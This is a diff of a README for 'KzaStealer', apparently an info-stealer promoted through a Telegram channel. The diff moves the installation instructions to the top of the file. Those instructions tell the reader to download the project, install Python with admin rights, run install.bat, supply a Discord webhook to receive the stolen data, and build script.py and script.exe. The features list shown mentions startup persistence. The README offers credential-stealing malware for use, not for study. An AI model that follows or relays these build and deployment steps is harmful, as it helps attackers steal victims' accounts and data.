@@ -1,5 +1,24 @@
 ##### Add 100 ⭐ Stars = updates and adding more and more. Join us on Telegram [https://t.me/DscDevTools](https://t.me/DscDevTools)
 ---
+### Installation Instructions  
+
+#### [Download](https://github.com/COKZA/KzaStealer/archive/refs/heads/main.zip)
+
+####  **Install [Python](https://www.python.org/downloads/)**  
+   - Make sure Python is installed on your system.  
+   - **Important:** Use **admin privileges** when installing `py.exe`.  
+   - During installation, check the box: **Add python.exe to PATH**.  
+   - Finally, click **Install Now** and complete the setup.  
+
+#### **Run `install.bat`**  
+   - Ensure Python is installed as mentioned above.  
+   - Run the `install.bat` file to install all the required dependencies automatically.  
+   - Once installation is complete:  
+     - Enter your **Discord Webhook** when prompted.  
+     - Wait for the process to merge all scripts and create `script.py` & `script.exe`.  
+
+---
+
 ### Features  
 
 - **Startup**  
@@ -80,24 +99,6 @@
 
 ---
 
-### Installation Instructions  
-
-#### [Download](https://github.com/COKZA/KzaStealer/archive/refs/heads/main.zip)
-
-####  **Install [Python](https://www.python.org/downloads/)**  
-   - Make sure Python is installed on your system.  
-   - **Important:** Use **admin privileges** when installing `py.exe`.  
-   - During installation, check the box: **Add python.exe to PATH**.  
-   - Finally, click **Install Now** and complete the setup.  
-
-#### **Run `install.bat`**  
-   - Ensure Python is installed as mentioned above.  
-   - Run the `install.bat` file to install all the required dependencies automatically.  
-   - Once installation is complete:  
-     - Enter your **Discord Webhook** when prompted.  
-     - Wait for the process to merge all scripts and create `script.py` & `script.exe`.  
-
----
 
 ### ⚠️ Disclaimer  
 
